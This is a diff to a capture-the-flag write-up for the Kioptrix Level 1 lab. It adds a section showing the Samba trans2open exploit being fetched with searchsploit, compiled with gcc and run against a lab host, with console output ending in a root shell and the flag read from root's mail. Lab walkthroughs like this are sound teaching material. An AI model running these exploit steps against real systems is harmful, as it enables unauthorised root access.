@@ -92,7 +92,7 @@ MSF: [Samba trans2open Overflow (Linux x86)](https://www.rapid7.com/db/modules/e
 
 <h3>Exploitation:80/tcp http</h3>
 
-A copy of the OpenFuckV2.c is copied into the current dir, which contains [instructions on how to update](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) and compile it. Once updated, trying to compile in Kali Linux produces some errors using <code>gcc</code>:
+A copy of the OpenFuckV2.c is downloaded into the current dir, which contains [instructions on how to update](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) and compile it. Once updated, trying to compile in Kali Linux produces some errors using <code>gcc</code>:
 
 <pre class="console-output">
 <span class="prompt">root@kali</span>:<span class="dir">~</span># searchsploit -m 764
@@ -229,3 +229,53 @@ kioptrix.level1
 The exploit completes successfully and a root level shell is spawned.
 
 <h3>Exploitation:139/tcp netbios-ssn</h3>
+
+A copy of the Samba trans2open exploit is downloaded to the current dir and compiled. Using instructions from the source code, the exploit is run:
+
+<pre class="console-output">
+<span class="prompt">root@kali</span>:<span class="dir">~</span># searchsploit -m 10
+Exploit: Samba < 2.2.8 (Linux/BSD) - Remote Code Execution
+    URL: https://www.exploit-db.com/exploits/10/
+   Path: /usr/share/exploitdb/platforms/multiple/remote/10.c
+
+Copied to: /root/10.c
+
+<span class="prompt">root@kali</span>:<span class="dir">~</span># gcc 10.c -o samba1
+<span class="prompt">root@kali</span>:<span class="dir">~</span># ./samba1 -b 0 -v 192.168.201.132
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
++ Verbose mode.
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Using ret: [0xbffffed4]
++ Using ret: [0xbffffda8]
++ Using ret: [0xbffffc7c]
++ Using ret: [0xbffffb50]
++ Worked!
+--------------------------------------------------------------
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+</pre>
+
+Once run, a root shell is spawned. Checking around the host, a flag can be found in root's mail:
+
+<pre class="console-output">
+cat /var/spool/mail/root
+From root  Sat Sep 26 11:42:10 2009
+Return-Path: <root@kioptix.level1>
+Received: (from root@localhost)
+	by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
+	for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
+Date: Sat, 26 Sep 2009 11:42:10 -0400
+From: root <root@kioptix.level1>
+Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
+To: root@kioptix.level1
+Subject: About Level 2
+Status: O
+
+If you are reading this, you got root. Congratulations.
+Level 2 won't be as easy...
+</pre>
+
+DONE!!
